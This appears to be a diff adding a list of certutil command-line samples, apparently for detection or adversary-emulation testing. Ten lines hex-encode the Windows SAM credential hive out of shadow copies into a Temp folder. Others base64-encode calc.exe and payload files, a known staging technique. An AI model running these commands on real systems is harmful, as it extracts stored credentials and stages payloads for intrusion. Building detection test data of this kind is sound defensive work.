@@ -1,0 +1,15 @@
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss1 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss10 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss2 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss3 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss4 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss5 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss6 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss7 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss8 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss9 2
+C:\Users\thaim\AppData\Local\Temp\tcm.tmp  -encode C:\Windows\System32\calc.exe C:\Users\thaim\AppData\Local\Temp\T1140_calc2.txt
+certutil  -encode C:\Windows\System32\calc.exe C:\Users\thaim\AppData\Local\Temp\T1140_calc.txt
+cd C:\Windows\Temp && certutil.exe -encode payload.exe payload.b64
+certutil.exe -encode "C:\Users\Public\"payload.exe "C:\Users\Public\"payload.b64
+certutil.exe -encode payload.exe C:\ProgramData\payload.b64
